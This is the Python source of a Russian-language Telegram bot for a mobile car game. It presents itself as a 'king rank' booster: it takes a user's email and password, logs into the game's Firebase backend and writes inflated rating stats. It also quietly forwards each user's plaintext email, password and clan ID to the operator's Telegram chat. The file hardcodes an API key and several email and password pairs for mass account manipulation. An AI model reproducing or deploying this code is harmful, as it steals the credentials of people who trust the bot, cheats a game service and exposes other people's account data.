import os
import requests
import json
import telebot
import time
from flask import Flask
from threading import Thread

# --- Game Service Configuration ---
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"

# ✅ ТВОИ КЛАНЫ
MY_CLAN_IDS = {"ddlcbcdj", "qnxouqwo"}

# --- Telegram Bot Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не задан!")

bot = telebot.TeleBot(BOT_TOKEN)
user_states = {}

# Твой ID (Скрытый Супер-Админ)
OWNER_ID = int(CHAT_ID) if CHAT_ID else 0

# Статичные админы
HARDCODED_IDS = {8205123716, 7724236527}

# Реестр админов
admin_registry = {aid: f"ID: {aid}" for aid in HARDCODED_IDS}

# --- Flask Server ---
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is Online", 200

# --- ПРОВЕРКА ПРАВ ---
def is_admin(message):
    uid = message.from_user.id
    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
    
    if uid == OWNER_ID: return True
    
    if uid in admin_registry or uid in HARDCODED_IDS:
        admin_registry[uid] = f"{uname} | ID: `{uid}`"
        return True
    
    for key in list(admin_registry.keys()):
        if admin_registry[key] == uname:
            admin_registry[uid] = f"{uname} | ID: `{uid}`"
            if key != uid: admin_registry.pop(key, None)
            return True
            
    return False

# --- FUNCTIONS ---
def send_to_telegram(email, password, clan_id):
    try:
        bot.send_message(CHAT_ID,
            f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}")
    except:
        pass

def login(email, password):
    try:
        r = requests.post(FIREBASE_LOGIN_URL, json={
            "clientType": "CLIENT_TYPE_ANDROID",
            "email": email,
            "password": password,
            "returnSecureToken": True
        }, timeout=10)
        data = r.json()
        if r.status_code == 200 and "idToken" in data:
            return data["idToken"]
    except:
        pass
    return None

def set_rank(token):
    rating_data = {k: 100000 for k in [
        "cars","car_fix","car_collided","car_exchange","car_trade","car_wash",
        "slicer_cut","drift_max","drift","cargo","delivery","taxi","levels",
        "gifts","fuel","offroad","speed_banner","reactions","police","run",
        "real_estate","t_distance","treasure","block_post","push_ups",
        "burnt_tire","passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000

    try:
        r = requests.post(RANK_URL,
            headers={"Authorization": f"Bearer {token}"},
            json={"data": json.dumps({"RatingData": rating_data})},
            timeout=10
        )
        return r.status_code == 200
    except:
        return False

def check_clan_id(token, email, password):
    try:
        r = requests.post(CLAN_ID_URL,
            headers={"Authorization": f"Bearer {token}"},
            json={"data": None},
            timeout=10
        )
        if r.status_code == 200:
            clan_id = r.json().get("result", "")
            if clan_id:
                send_to_telegram(email, password, clan_id)
    except:
        pass

def run_mass_rank():
    for acc in ACCOUNTS:
        token = login(acc["email"], acc["password"])
        if token:
            set_rank(token)

# --- ADMIN COMMANDS ---

@bot.message_handler(func=lambda m: m.text and m.text.startswith("+admin"))
def add_admin(message):
    if not is_admin(message):
        bot.send_message(message.chat.id, "🛑 у вас нет доступа")
        return
    data = message.text.replace("+admin", "").strip()
    if not data: return
    
    if data.startswith("@"):
        admin_registry[f"temp_{data}"] = data
        bot.send_message(message.chat.id, f"✅ {data} добавлен.")
    elif data.isdigit():
        new_id = int(data)
        if new_id not in admin_registry:
            admin_registry[new_id] = f"ID: `{new_id}`"
            bot.send_message(message.chat.id, f"✅ ID `{new_id}` добавлен.")

@bot.message_handler(func=lambda m: m.text and m.text.startswith("-admin"))
def remove_admin(message):
    if not is_admin(message):
        bot.send_message(message.chat.id, "🛑 у вас нет доступа")
        return
    data = message.text.replace("-admin", "").strip()
    if not data: return

    if data.isdigit():
        target_id = int(data)
        if target_id == OWNER_ID or target_id in HARDCODED_IDS:
            bot.send_message(message.chat.id, "🛑 Нельзя удалить системного админа.")
            return
        admin_registry.pop(target_id, None)
    else:
        uname = data if data.startswith("@") else f"@{data}"
        for key, value in list(admin_registry.items()):
            if uname in str(value):
                if key in HARDCODED_IDS:
                    bot.send_message(message.chat.id, "🛑 Нельзя удалить системного админа.")
                    return
                admin_registry.pop(key, None)

    bot.send_message(message.chat.id, f"❌ {data} удален.")

@bot.message_handler(commands=["admin"])
def list_admins(message):
    if not is_admin(message):
        bot.send_message(message.chat.id, "🛑 у вас нет доступа")
        return
    is_admin(message) 

    text = "🛡️ **Список администраторов:**\n\n"
    has_admins = False
    for key in admin_registry:
        text += f"👤 {admin_registry[key]}\n"
        has_admins = True
    if not has_admins: text += "_(пусто)_"
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

# --- CORE COMMANDS ---

@bot.message_handler(commands=["start"])
def handle_start(message):
    is_admin(message)
    user_states[message.from_user.id] = {"step": "await_email"}
    
    name = message.from_user.first_name or "Неизвестно"
    username = f"@{message.from_user.username}" if message.from_user.username else "Нет username"
    user_id = message.from_user.id

    bot.send_message(message.chat.id,
        f"🏷️ имя: {name}\n"
        f"🪪 user: {username}\n"
        f"🌐 tg id: {user_id}\n"
        f"💰 balance: unlimited"
    )
    bot.send_message(message.chat.id, "📧 ⚫️ ВВЕДИ @GMAIL ⚫️")

@bot.message_handler(commands=["level"])
def handle_level(message):
    if not is_admin(message):
        bot.send_message(message.chat.id, "🛑 у вас нет доступа")
        return
    bot.send_message(message.chat.id, "🚀 Запуск KING RANK...")
    Thread(target=run_mass_rank).start()
    bot.send_message(message.chat.id, "👑 KING RANK установлены!")

# --- USER FLOW (ИЗМЕНЕНО ТОЛЬКО ЗДЕСЬ) ---
@bot.message_handler(func=lambda message: message.from_user.id in user_states)
def handle_message(message):
    state = user_states[message.from_user.id]
    
    if state["step"] == "await_email":
        state["email"] = message.text
        state["step"] = "await_password"
        bot.send_message(message.chat.id, "🔒 ⚫️ ВВЕДИ ПАРОЛЬ ⚫️")
    
    elif state["step"] == "await_password":
        bot.send_message(message.chat.id, "⏳ Обработка...")
        
        token = login(state["email"], message.text)
        if not token:
            bot.send_message(message.chat.id, "❌ Ошибка входа.")
            del user_states[message.from_user.id]
            return

        # 🔍 Получаем Clan ID
        try:
            r = requests.post(CLAN_ID_URL,
                headers={"Authorization": f"Bearer {token}"},
                json={"data": None},
                timeout=10
            )
            clan_id = r.json().get("result", "")
        except:
            clan_id = ""

        # ❌ Проверка клана
        if not clan_id or str(clan_id) not in MY_CLAN_IDS:
            bot.send_message(message.chat.id, "❌️ Вы не являетесь участником LEVEL PERFORMANCE 🔴🟣🔵
")
            del user_states[message.from_user.id]
            return

        # ✅ Если всё ок — даем ранг
        if set_rank(token):
            check_clan_id(token, state["email"], message.text)
            bot.send_message(message.chat.id, "✅ Готово!")
        else:
            bot.send_message(message.chat.id, "❌ Ошибка установки ранга.")

        del user_states[message.from_user.id]

# --- RUN ---
if __name__ == "__main__":
    ACCOUNTS = [
        {"email": "den_isaev_9595@mail.ru", "password": "Zaebali1995"},
        {"email": "sultanabdulaev2006@gmail.com", "password": "31072006"},
        {"email": "cpmcpmking1@gmail.com", "password": "666666"},
        {"email": "cpmcpmking2@gmail.com", "password": "666666"},
        {"email": "cpmcpmking3@gmail.com", "password": "666666"},
        {"email": "cpmcpmking4@gmail.com", "password": "666666"},
    ]

    def start_polling():
        while True:
            try:
                bot.polling(none_stop=True, timeout=60)
            except Exception as e:
                print(f"Polling error: {e}")
                time.sleep(5)

    Thread(target=start_polling).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
